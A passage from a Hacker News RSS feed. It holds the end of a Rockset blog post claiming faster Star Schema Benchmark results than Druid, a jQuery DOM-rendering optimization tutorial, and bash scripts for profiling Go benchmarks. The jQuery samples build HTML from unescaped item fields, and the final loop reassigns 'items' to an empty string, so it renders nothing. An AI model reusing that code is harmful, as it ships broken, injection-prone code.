https://images.ctfassets.net/1d31s1aajogl/gtyqIwjx5kKG2PxpXGrJk/2842c3354e855724fee008c2a252a1da/rockset-ssb-results.png?w=562&amp;fm=webp 562w,
https://images.ctfassets.net/1d31s1aajogl/gtyqIwjx5kKG2PxpXGrJk/2842c3354e855724fee008c2a252a1da/rockset-ssb-results.png?w=1124&amp;fm=webp 1124w" sizes="(max-width: 590px) 100vw, 590px" type="image/webp">
          <source srcset="https://images.ctfassets.net/1d31s1aajogl/gtyqIwjx5kKG2PxpXGrJk/2842c3354e855724fee008c2a252a1da/rockset-ssb-results.png?w=281 281w,
https://images.ctfassets.net/1d31s1aajogl/gtyqIwjx5kKG2PxpXGrJk/2842c3354e855724fee008c2a252a1da/rockset-ssb-results.png?w=562 562w,
https://images.ctfassets.net/1d31s1aajogl/gtyqIwjx5kKG2PxpXGrJk/2842c3354e855724fee008c2a252a1da/rockset-ssb-results.png?w=1124 1124w" sizes="(max-width: 590px) 100vw, 590px">
          <img alt="rockset-ssb-results" title="" src="https://images.ctfassets.net/1d31s1aajogl/gtyqIwjx5kKG2PxpXGrJk/2842c3354e855724fee008c2a252a1da/rockset-ssb-results.png" loading="lazy">
        </picture>
        </span>
      </span>
<em>Figure 2: Benchmark results when running SSB on Rockset (600M rows, 100GB data set)</em></p>
<p>All queries in the SSB suite executed in under 1 second on Rockset, with a median runtime of 254 ms. This result demonstrates Rockset‚Äôs ability to run complex analytics with sub-second performance, a common requirement for real-time analytics applications.</p>
<p>When comparing to these results with Druid‚Äôs, we observe that 9 out of the 13 queries ran faster on Rockset. Rockset was 9.4x faster on the query with the largest speedup, with many queries in the 2x to 4x range, whereas Druid‚Äôs largest advantage was a 3.2x speedup. The suite of 13 queries completed in 4,146 ms on Rockset compared to 6,043 ms on Druid, corresponding to a 1.5x speedup overall. The following figures show Rockset‚Äôs query runtimes compared to those reported in Imply‚Äôs Druid and BigQuery paper.</p>
<p><span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/1d31s1aajogl/3iI6RKmdNIU1LMPZADHr4L/c85c70cd8a53d8a2e25f1359e210f5ab/rockset-druid-ssb.png?w=408&amp;fm=webp 408w,
https://images.ctfassets.net/1d31s1aajogl/3iI6RKmdNIU1LMPZADHr4L/c85c70cd8a53d8a2e25f1359e210f5ab/rockset-druid-ssb.png?w=815&amp;fm=webp 815w,
https://images.ctfassets.net/1d31s1aajogl/3iI6RKmdNIU1LMPZADHr4L/c85c70cd8a53d8a2e25f1359e210f5ab/rockset-druid-ssb.png?w=1630&amp;fm=webp 1630w" sizes="(max-width: 590px) 100vw, 590px" type="image/webp">
          <source srcset="https://images.ctfassets.net/1d31s1aajogl/3iI6RKmdNIU1LMPZADHr4L/c85c70cd8a53d8a2e25f1359e210f5ab/rockset-druid-ssb.png?w=408 408w,
https://images.ctfassets.net/1d31s1aajogl/3iI6RKmdNIU1LMPZADHr4L/c85c70cd8a53d8a2e25f1359e210f5ab/rockset-druid-ssb.png?w=815 815w,
https://images.ctfassets.net/1d31s1aajogl/3iI6RKmdNIU1LMPZADHr4L/c85c70cd8a53d8a2e25f1359e210f5ab/rockset-druid-ssb.png?w=1630 1630w" sizes="(max-width: 590px) 100vw, 590px">
          <img alt="rockset-druid-ssb" title="" src="https://images.ctfassets.net/1d31s1aajogl/3iI6RKmdNIU1LMPZADHr4L/c85c70cd8a53d8a2e25f1359e210f5ab/rockset-druid-ssb.png" loading="lazy">
        </picture>
        </span>
      </span>
<em>Figure 3: Comparing Rockset and Druid SSB results</em></p>
<p><span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/1d31s1aajogl/2nTaKbhcNK407P8T9r15ye/477be128e68d9a5535629d2cbccbbb7f/rockset-ssb-graph.png?w=429&amp;fm=webp 429w,
https://images.ctfassets.net/1d31s1aajogl/2nTaKbhcNK407P8T9r15ye/477be128e68d9a5535629d2cbccbbb7f/rockset-ssb-graph.png?w=857&amp;fm=webp 857w,
https://images.ctfassets.net/1d31s1aajogl/2nTaKbhcNK407P8T9r15ye/477be128e68d9a5535629d2cbccbbb7f/rockset-ssb-graph.png?w=1714&amp;fm=webp 1714w" sizes="(max-width: 590px) 100vw, 590px" type="image/webp">
          <source srcset="https://images.ctfassets.net/1d31s1aajogl/2nTaKbhcNK407P8T9r15ye/477be128e68d9a5535629d2cbccbbb7f/rockset-ssb-graph.png?w=429 429w,
https://images.ctfassets.net/1d31s1aajogl/2nTaKbhcNK407P8T9r15ye/477be128e68d9a5535629d2cbccbbb7f/rockset-ssb-graph.png?w=857 857w,
https://images.ctfassets.net/1d31s1aajogl/2nTaKbhcNK407P8T9r15ye/477be128e68d9a5535629d2cbccbbb7f/rockset-ssb-graph.png?w=1714 1714w" sizes="(max-width: 590px) 100vw, 590px">
          <img alt="rockset-ssb-graph" title="" src="https://images.ctfassets.net/1d31s1aajogl/2nTaKbhcNK407P8T9r15ye/477be128e68d9a5535629d2cbccbbb7f/rockset-ssb-graph.png" loading="lazy">
        </picture>
        </span>
      </span>
<em>Figure 4: Graph showing Rockset, Druid and BigQuery runtimes on SSB queries</em></p>
<h3>How Rockset Accelerates Real-Time Analytics</h3>
<p>Several Rockset features work in concert to accelerate these SSB queries and real-time analytics in general.</p>
<ul>
<li>Converged Index‚Ñ¢</li>
<li>Column-based clustering</li>
<li>Vectorization</li>
</ul>
<p><strong>Converged Index</strong></p>
<p>Rockset stores all ingested data in a <a href="https://rockset.com/blog/how-rocksets-converged-index-powers-real-time-analytics/">Converged Index</a>, which is a combination of: </p>
<ul>
<li>Inverted index</li>
<li>Column-based index</li>
<li>Row-based index</li>
</ul>
<p>Each query can take advantage of the index that is best suited for it and leads to the fastest execution. For instance, highly selective queries typically benefit from using the inverted index, while queries that require aggregations over large numbers of records will benefit from using the column-based index. By indexing data in three different ways, multiple types of queries can be executed efficiently without any manual intervention.</p>
<p><strong>Column-based clustering</strong></p>
<p>Users can configure column-based clustering so as to colocate data according to a clustering key they specify. This maximizes the opportunity for sequential access and reduces the amount of data that needs to be scanned for each query.</p>
<p><strong>Vectorization</strong></p>
<p>Rockset uses columnar data chunks to exchange data between query execution operators. This allows vectorized processing, where operations are performed on many values, instead of one value, at a time, resulting in more efficient query execution.</p>
<h3>What This Means for Developers of Real-Time Analytics</h3>
<p>With this SSB performance evaluation, we determined that Rockset is capable of delivering the sub-second query latency needed for real-time analytics, with better performance than alternatives like Druid. Coupled with the earlier RockBench evaluation that established Rockset‚Äôs ability to analyze data being written in real time, we see that Rockset can be a good fit for real-time analytics applications that require fast queries on the latest data. These include many use cases like logistics tracking, security analytics, e-commerce personalization, gaming leaderboards and customer-facing SaaS analytics.</p>
<p>While this evaluation was performed on a denormalized data set, Rockset's design also allows it to execute joins efficiently, so applications are not limited to operating on denormalized data. Future work would include running Rockset performance evaluations involving joins on normalized data.</p>
<p>Additionally, SSB data is well structured and therefore less representative of the real-life semi-structured data sets we commonly come across. It should be noted that Rockset can support the same analytical SQL queries on complex, nested data as well.</p>
<p>Given Rockset‚Äôs ability to provide both the write and read performance required for real-time analytics, we invite you to include Rockset in your consideration if you are developing real-time analytics features or products. Read the <a href="http://rockset.com/star-schema-benchmark">Rockset Performance Evaluation on the Star Schema Benchmark</a> white paper to get the details on how we ran the SSB evaluation. Or, <a href="https://console.rockset.com/create">sign up for a free Rockset account</a> to try running your own queries on Rockset!</p></div></div>]]>
            </description>
            <link>https://rockset.com/blog/rockset-up-to-9x-faster-than-apache-druid-star-schema-benchmark/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26184105</guid>
            <pubDate>Thu, 18 Feb 2021 19:09:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizing jQuery DOM Manipulation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26183834">thread link</a>) | @pazvanti
<br/>
February 18, 2021 | https://petrepopescu.tech/2021/02/optimizing-jquery-dom-manipulation/ | <a href="https://web.archive.org/web/*/https://petrepopescu.tech/2021/02/optimizing-jquery-dom-manipulation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>If you are working with JavaScript then most probably jQuery is a library you are using quite frequently. jQuery is useful and provides many features that are harder to achieve with basic JavaScript. Due to the fact that it usually runs on the client-side, many don‚Äôt pay too much attention to optimizing the code. That is why there are many websites that load slowly, have sluggish UIs, or seem to respond with delay. So, in this article, I will show an optimization technique that can save a lot of time when rendering the page with dynamically added elements.</p><h4>Our scenario: Loading products without reloading the page</h4><p>Let us take a look at a common use case where this technique may be useful. You are a developer that is working on an online store. Because of the nature of the infrastructure and the client‚Äôs requirements, React is not an option so you fall back to a more ‚Äútraditional‚Äù approach. There is only one server application, being it Play (Java/Scala), CodeIgniter (PHP) or any other framework that using a template engine renders the DOM of the pages.</p><p>Now, as part of the catalog navigation feature, you get the partial result (in batches of 100 items) and display them on the page with a pagination menu at the bottom. When the next page is clicked, instead of physically going to a new page, you use AJAX calls to get the new items and do DOM manipulation to display them. The steps are like this:</p><ol><li>AJAX call to /items?page=&lt;pageNumber&gt;</li><li>Receive response as JSON</li><li>Clear the existing displayed items from the page</li><li>Rebuild the DOM with the new items</li></ol><h4>First implementation (bad): Rendering each element individually</h4><p>Let us look at a portion of the code. This function creates the HTML for a product and alters the DOM so that it is displayed on the page (image, name, and price)</p><pre><code lang="javascript">function&nbsp;makeItemOnPage(item,&nbsp;itemNo)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;we&nbsp;create&nbsp;a&nbsp;container&nbsp;for&nbsp;the&nbsp;current&nbsp;item
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;itemContainer&nbsp;=&nbsp;'&lt;div&nbsp;class="col-sm-2&nbsp;itemContainer"&nbsp;id="item-'&nbsp;+&nbsp;itemNo&nbsp;+&nbsp;'"&nbsp;style="padding:&nbsp;10px"&gt;&lt;/div&gt;';
&nbsp;&nbsp;&nbsp;&nbsp;$("#products").append(itemContainer);

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;we&nbsp;create&nbsp;a&nbsp;div&nbsp;for&nbsp;the&nbsp;product&nbsp;imate&nbsp;and&nbsp;display&nbsp;it
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;productImage&nbsp;=&nbsp;'&lt;div&nbsp;class="productImage"&nbsp;id="productImage-'&nbsp;+&nbsp;itemNo&nbsp;+&nbsp;'"&gt;&lt;/div&gt;';
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;currentItemContainer&nbsp;=&nbsp;$("#products").find("#item-"&nbsp;+&nbsp;itemNo);
&nbsp;&nbsp;&nbsp;&nbsp;currentItemContainer.append(productImage);
&nbsp;&nbsp;&nbsp;&nbsp;$("#productImage-"+itemNo).append('&lt;img&nbsp;src="'&nbsp;+&nbsp;item.image&nbsp;+&nbsp;'"&nbsp;/&gt;');

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;We&nbsp;append&nbsp;the&nbsp;product&nbsp;name&nbsp;and&nbsp;the&nbsp;price
&nbsp;&nbsp;&nbsp;&nbsp;currentItemContainer.append('&lt;/div&gt;&lt;div&nbsp;class="productDetails"&gt;&lt;strong&gt;'&nbsp;+&nbsp;item.name&nbsp;+&nbsp;'&lt;/strong&gt;&nbsp;-&nbsp;'&nbsp;+&nbsp;item.price&nbsp;+&nbsp;'$');

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;We&nbsp;create&nbsp;an&nbsp;Add&nbsp;To&nbsp;Cart&nbsp;button
&nbsp;&nbsp;&nbsp;&nbsp;currentItemContainer.append('&lt;button&nbsp;type="button"&nbsp;class="btn&nbsp;btn-success&nbsp;btn-block"&gt;&lt;i&nbsp;class="fa&nbsp;fa-bell"&gt;&lt;/i&gt;&nbsp;Add&nbsp;to&nbsp;cart&lt;/button&gt;')
}</code></pre><div><figure><img loading="lazy" width="471" height="246" src="https://petrepopescu.tech/wp-content/uploads/2021/01/image-5.png" alt="" srcset="https://petrepopescu.tech/wp-content/uploads/2021/01/image-5.png 471w, https://petrepopescu.tech/wp-content/uploads/2021/01/image-5-300x157.png 300w" sizes="(max-width: 471px) 100vw, 471px"></figure></div><p>Let us render 1000 items in total and see the time it takes. I exaggerated a bit the number of items so that the total gains from optimization to be better shown. We can easily see how long it takes by using the browser‚Äôs performance analyzer. As can be seen in the image, it took about 1.7 seconds for the items to be rendered on the page. It may not seem much (we do have 1000 items), but the HTML in this case is quite simple and does not have too many inner objects. A page that has a much more complex design can easily have a more complex HTML code for each item. And even so, the user having to wait almost 2 seconds for the items to get displayed is not good from an UX point of view. I think we can optimize things quite a lot.</p><p>First thing we see is that we do a lot of search for elements in the page and many appends. We search for the items container, append a div for the current item container, search for it, append the image, append the name and price and after that another append for the button. Analyzing the times in the Performance Inspector, we see that those appends take quite a long time, almost equal to the total time. So, let‚Äôs try creating the HTML for the entire item as one string and appending it all once.</p><p>The code is like this:</p><pre><code lang="javascript">function&nbsp;makeItemOnPage(item,&nbsp;itemNo)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;we&nbsp;create&nbsp;a&nbsp;container&nbsp;for&nbsp;the&nbsp;current&nbsp;item
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;productImageHtml&nbsp;=&nbsp;getProductImageHtml(item,&nbsp;itemNo);
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;productDetailsHtml&nbsp;=&nbsp;getProductDetailsHtml(item,&nbsp;itemNo);
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;addToCart&nbsp;=&nbsp;getAddToCartButton(item,&nbsp;itemNo);
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;itemContainer&nbsp;=&nbsp;'&lt;div&nbsp;class="col-sm-2&nbsp;itemContainer"&nbsp;id="item-'&nbsp;+&nbsp;itemNo&nbsp;+&nbsp;'"&nbsp;style="padding:&nbsp;10px"&gt;';
&nbsp;&nbsp;&nbsp;&nbsp;itemContainer&nbsp;+=&nbsp;productImageHtml;
&nbsp;&nbsp;&nbsp;&nbsp;itemContainer&nbsp;+=&nbsp;productDetailsHtml;
&nbsp;&nbsp;&nbsp;&nbsp;itemContainer&nbsp;+=&nbsp;addToCart;
&nbsp;&nbsp;&nbsp;&nbsp;itemContainer&nbsp;+=&nbsp;"&lt;/div&gt;";
&nbsp;&nbsp;&nbsp;&nbsp;$("#products").append(itemContainer);
}

function&nbsp;getProductImageHtml(item,&nbsp;itemNo)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;'&lt;div&nbsp;class="productImage"&nbsp;id="productImage-'&nbsp;+&nbsp;itemNo&nbsp;+&nbsp;'"&gt;&lt;img&nbsp;src="'&nbsp;+&nbsp;item.image&nbsp;+&nbsp;'"&nbsp;/&gt;&lt;/div&gt;';
}

function&nbsp;getProductDetailsHtml(item,&nbsp;itemNo)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;'&lt;div&nbsp;class="productDetails"&gt;&lt;strong&gt;'&nbsp;+&nbsp;item.name&nbsp;+&nbsp;'&lt;/strong&gt;&nbsp;-&nbsp;'&nbsp;+&nbsp;item.price&nbsp;+&nbsp;'$&lt;/div&gt;';
}

function&nbsp;getAddToCartButton(item,&nbsp;itemNo)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;'&lt;button&nbsp;type="button"&nbsp;class="btn&nbsp;btn-success&nbsp;btn-block"&gt;&lt;i&nbsp;class="fa&nbsp;fa-bell"&gt;&lt;/i&gt;&nbsp;Add&nbsp;to&nbsp;cart&lt;/button&gt;';
}</code></pre><div><figure><img loading="lazy" width="428" height="153" src="https://petrepopescu.tech/wp-content/uploads/2021/01/image-6.png" alt="" srcset="https://petrepopescu.tech/wp-content/uploads/2021/01/image-6.png 428w, https://petrepopescu.tech/wp-content/uploads/2021/01/image-6-300x107.png 300w" sizes="(max-width: 428px) 100vw, 428px"></figure></div><p>Now, doing the benchmark again we clearly see a decrease in render time. It is now less than one second, about 1/3 of the previous time. This is because the number of calls to .append() was reduced to only one per item. But we can do even better.</p><h4>Building the needed HTML and appending once</h4><p>Now comes the final optimization. Instead of building each product view and appending it, we can do this by building the entire list of products and adding the resulting HTML to the container in one single go. This way we call append() once which will result in only one redraw of the UI elements. The code is almost identical, but instead of calling append at the end, we just return the resulting string.</p><pre><code lang="javascript">function&nbsp;makeItemOnPage(item,&nbsp;itemNo)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;we&nbsp;create&nbsp;a&nbsp;container&nbsp;for&nbsp;the&nbsp;current&nbsp;item
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;productImageHtml&nbsp;=&nbsp;getProductImageHtml(item,&nbsp;itemNo);
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;productDetailsHtml&nbsp;=&nbsp;getProductDetailsHtml(item,&nbsp;itemNo);
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;addToCart&nbsp;=&nbsp;getAddToCartButton(item,&nbsp;itemNo);
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;itemContainer&nbsp;=&nbsp;'&lt;div&nbsp;class="col-sm-2&nbsp;itemContainer"&nbsp;id="item-'&nbsp;+&nbsp;itemNo&nbsp;+&nbsp;'"&nbsp;style="padding:&nbsp;10px"&gt;';
&nbsp;&nbsp;&nbsp;&nbsp;itemContainer&nbsp;+=&nbsp;productImageHtml;
&nbsp;&nbsp;&nbsp;&nbsp;itemContainer&nbsp;+=&nbsp;productDetailsHtml;
&nbsp;&nbsp;&nbsp;&nbsp;itemContainer&nbsp;+=&nbsp;addToCart;
&nbsp;&nbsp;&nbsp;&nbsp;itemContainer&nbsp;+=&nbsp;"&lt;/div&gt;";
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;itemContainer;
}</code></pre><div><div><p>Now, where we receive our data from the server, after building the HML string, we call append on the container, similar to the code on the right. Let‚Äôs re-run the benchmark again.</p><figure><img loading="lazy" width="408" height="167" src="https://petrepopescu.tech/wp-content/uploads/2021/01/image-7.png" alt="" srcset="https://petrepopescu.tech/wp-content/uploads/2021/01/image-7.png 408w, https://petrepopescu.tech/wp-content/uploads/2021/01/image-7-300x123.png 300w" sizes="(max-width: 408px) 100vw, 408px"></figure><p>Now we have less than 150ms in this particular example, more than 4 times faster than in the previous version and 12 times faster than the first version. The final result <a href="http://petrepopescu.tech/wp-content/uploads/2021/01/jquery-dom-optimization.zip">can be downloaded from here</a>.</p></div><div><pre><code lang="javascript">function&nbsp;makeItems()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#products").empty();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;items = getItems();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;itemNo&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;items&nbsp;=&nbsp;"";
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(itemNo&nbsp;=&nbsp;0;&nbsp;itemNo&lt;&nbsp;items.length;&nbsp;itemNo++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;items&nbsp;+=&nbsp;makeItemOnPage(items[itemNo],&nbsp;itemNo);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#products").append(items);
&nbsp;&nbsp;&nbsp;&nbsp;}</code></pre></div></div><h4>Conclusions</h4><p>I used a similar technique to optimize page generation based on some input for an offline-only utility that runs in the browser. It was a log viewer and parser and the initial version took around 6 seconds to process a 3000 log file. After optimizing the calls, the same log was parsed and displayed in less than 0.8 seconds, a big improvement in both time and user experience.</p><p>Now, I know that generating HTML code like this has drawbacks, but there are many scenarios where not only does it help, it offers benefits like reduced server load. If you are careful to properly split code generation and don‚Äôt mix different elements in the same generator function, the JavaScript code can remain clean and easy to maintain.</p><p>As a final note, I am primarily a back-end developer, so more experienced JavaScript users may have even better solutions as well as objections to this approach.</p></div></div></div>]]>
            </description>
            <link>https://petrepopescu.tech/2021/02/optimizing-jquery-dom-manipulation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183834</guid>
            <pubDate>Thu, 18 Feb 2021 18:47:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Easy Profiling Go Benchmark Tests with Bash]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26183698">thread link</a>) | @blainsmith
<br/>
February 18, 2021 | https://blainsmith.com/articles/easy-profiling-go-benchmark-tests-with-bash/ | <a href="https://web.archive.org/web/*/https://blainsmith.com/articles/easy-profiling-go-benchmark-tests-with-bash/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content">
  <article>
    <header>
      
      <p id="date">
        <time>Feb 18, 2021</time>
      </p>
    </header>
    <p>There are a lot of great articles on the interwebs about profiling entire Go applications for CPU and memory usage, however I can never remember the syntax for doing the same thing for specific Benchmark-prefixed tests. Editors have great support for running these tests, but sometimes I want to be able to produce binary and profile output files to open in the visualizer for further inspection. So like any lazy programmer I made a few scripts to do all the work for me.</p>
<p><strong>bench.sh</strong></p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span></code></pre></td>
<td>
<pre><code data-lang="bash"><span>#!/bin/sh
</span><span></span>
<span>if</span> <span>[</span> <span>$#</span> -eq <span>0</span> <span>]</span>
    <span>then</span>
        <span>printf</span> <span>"Runs a specified benchmark test func and opens the profile in Chrome.\n\n"</span>
        <span>printf</span> <span>"Usage:\n"</span>
        <span>printf</span> <span>"\t./bench.sh &lt;cpu|mem&gt; &lt;dir&gt; &lt;function&gt;\n\n"</span>
        <span>printf</span> <span>"Example:\n"</span>
        <span>printf</span> <span>"\t./bench.sh cpu ./internal BenchmarkBinaryEncoding\n\n"</span>
        <span>exit</span> <span>0</span>
<span>fi</span>

go <span>test</span> -bench<span>=</span><span>${</span><span>3</span><span>}</span> -benchmem -<span>${</span><span>1</span><span>}</span>profile profile.out -o bench.test <span>${</span><span>2</span><span>}</span>
go tool pprof -http<span>=</span>:6060 bench.test profile.out
</code></pre></td></tr></tbody></table>
</div>
</div><p><strong>trace.sh</strong></p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span></code></pre></td>
<td>
<pre><code data-lang="bash"><span>#!/bin/sh
</span><span></span>
<span>if</span> <span>[</span> <span>$#</span> -eq <span>0</span> <span>]</span>
    <span>then</span>
        <span>printf</span> <span>"Runs a specified benchmark test func and opens the trace profile in Chrome.\n\n"</span>
        <span>printf</span> <span>"Usage:\n"</span>
        <span>printf</span> <span>"\t./trace.sh &lt;dir&gt; &lt;function&gt;\n\n"</span>
        <span>printf</span> <span>"Example:\n"</span>
        <span>printf</span> <span>"\t./trace.sh ./internal BenchmarkBinaryEncoding\n\n"</span>
        <span>exit</span> <span>0</span>
<span>fi</span>

go <span>test</span> -bench<span>=</span><span>${</span><span>2</span><span>}</span> -trace trace.out -o trace.test <span>${</span><span>1</span><span>}</span>
go tool trace -http<span>=</span>:6060 trace.test trace.out
</code></pre></td></tr></tbody></table>
</div>
</div><p>Lets consider a sample Go project layout that looks something like the following:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span></code></pre></td>
<td>
<pre><code data-lang="text">my-go-project/
‚îú‚îÄ cmd/
‚îÇ  ‚îú‚îÄ server/
‚îÇ  ‚îÇ  ‚îú‚îÄ main.go
‚îú‚îÄ internal/
‚îÇ  ‚îú‚îÄ encoding.go
‚îÇ  ‚îú‚îÄ encoding_bench_test.go
‚îÇ  ‚îú‚îÄ encoding_test.go
‚îú‚îÄ scripts/
‚îÇ  ‚îú‚îÄ bench.sh
‚îÇ  ‚îú‚îÄ tests.sh
‚îÇ  ‚îú‚îÄ trace.sh
‚îú‚îÄ go.mod
‚îú‚îÄ go.sum
‚îú‚îÄ README.md
</code></pre></td></tr></tbody></table>
</div>
</div><p>Inside the internal directory there is encoding_bench_test.go which has a benchmark function called BenchmarkBinaryEncoding that we want to profile.</p>
<p><strong>./internal/encoding_bench_test.go</strong></p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>package</span> <span>internal_test</span>
<span>...</span>
<span>func</span> <span>BenchmarkBinaryEncoding</span><span>(</span><span>b</span> <span>*</span><span>testing</span><span>.</span><span>B</span><span>)</span> <span>{</span>
    <span>...</span>
<span>}</span>
<span>...</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>You can see we placed <strong>bench.sh</strong> and <strong>trace.sh</strong> inside the scripts folder so we can run it from the root of the project and see the help menu.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span><span>9
</span></code></pre></td>
<td>
<pre><code data-lang="text">my-go-project on master via Go v1.16
&gt; ./scripts/bench.sh
Runs a specified benchmark test in app's package and opens the profile in Chrome.

Usage:
	./bench.sh &lt;cpu|mem&gt; &lt;dir&gt; &lt;function&gt;

Example:
	./bench.sh cpu ./internal BenchmarkBinaryEncoding
</code></pre></td></tr></tbody></table>
</div>
</div><p>Running it with the correct arguments will perform the following:</p>
<ol>
<li>Run the benchmark test BenchmarkBinaryEncoding within the internal package and capture the cpu|memory profile</li>
<li>Write a test binary and profile file to disk</li>
<li>Launch the profiler visualizer on port :6060 with test binary and profile</li>
</ol>
<p>Now let's run the BenchmarkBinaryEncoding function in the internal package.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span></code></pre></td>
<td>
<pre><code data-lang="text">my-go-project on master via Go v1.16
&gt; ./scripts/bench.sh cpu ./internal BenchmarkBinaryEncoding
goos: linux
goarch: amd64
pkg: my-go-project/internal
cpu: Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz
BenchmarkBinaryEncoding-8   	  567564	      1916 ns/op	     979 B/op	       3 allocs/op
PASS
ok  	my-go-project/internal	2.047s
Serving web UI on http://localhost:6060
</code></pre></td></tr></tbody></table>
</div>
</div><p>At this point the browser should open automatically so you can poke around the CPU profile. Once you are done you can close the browser and quit the bash process and go about your business.</p>
<p>The <strong>trace.sh</strong> script operates the same way as <strong>bench.sh</strong>, but it opens the trace visualizer in the browser.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span></code></pre></td>
<td>
<pre><code data-lang="text">my-go-project on master via Go v1.16
&gt; ./scripts/trace.sh ./internal BenchmarkBinaryEncoding
goos: linux
goarch: amd64
pkg: my-go-project/internal
cpu: Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz
BenchmarkBinaryEncoding-8   	  567564	      1916 ns/op	     979 B/op	       3 allocs/op
PASS
ok  	my-go-project/internal	2.047s
2021/02/18 13:17:50 Parsing trace...
2021/02/18 13:17:51 Splitting trace...
2021/02/18 13:17:51 Opening browser. Trace viewer is listening on http://[::]:6060
</code></pre></td></tr></tbody></table>
</div>
</div><p>I found these scripts to be super helpful to reduce the feedback loop of changing code and running a benchmark to see if things changed. I hope this helps you as much as it has helped me in my day-to-day work and if there are things that can be improved please reach out and let me know.</p>
<p>Happy pprof-ing!</p>

  </article>
</section></div>]]>
            </description>
            <link>https://blainsmith.com/articles/easy-profiling-go-benchmark-tests-with-bash/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183698</guid>
            <pubDate>Thu, 18 Feb 2021 18:37:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The 1802 Membership Card Computer]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26183553">thread link</a>) | @bilegeek
<br/>
February 18, 2021 | http://www.sunrise-ev.com/1802.htm | <a href="https://web.archive.org/web/*/http://www.sunrise-ev.com/1802.htm">archive.org</a>
